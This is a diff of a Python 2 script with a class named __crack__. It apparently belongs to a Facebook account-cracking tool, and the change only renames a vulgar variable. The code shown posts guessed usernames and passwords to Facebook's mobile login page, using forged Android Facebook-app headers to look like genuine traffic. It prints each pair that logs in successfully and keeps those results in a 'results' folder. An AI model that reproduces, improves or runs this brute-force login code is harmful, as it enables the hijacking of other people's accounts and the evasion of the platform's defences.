@@ -56,7 +56,7 @@ id = []
 user = []
 loop = 0
 memek = random.randint(20000000.0, 30000000.0)
-kontod = random.randint(20000, 40000)
+kentod = random.randint(20000, 40000)
 # lempankkkkkkkk
 def jalan(z):
     for e in z + '\n':
@@ -698,7 +698,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers = {'x-fb-connection-bandwidth': repr(memek), 'x-fb-sim-hni': repr(kontod), 'x-fb-net-hni': repr(kontod), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
+            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers = {'x-fb-connection-bandwidth': repr(memek), 'x-fb-sim-hni': repr(kentod), 'x-fb-net-hni': repr(kentod), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'})
             xo = aw.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
                 print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
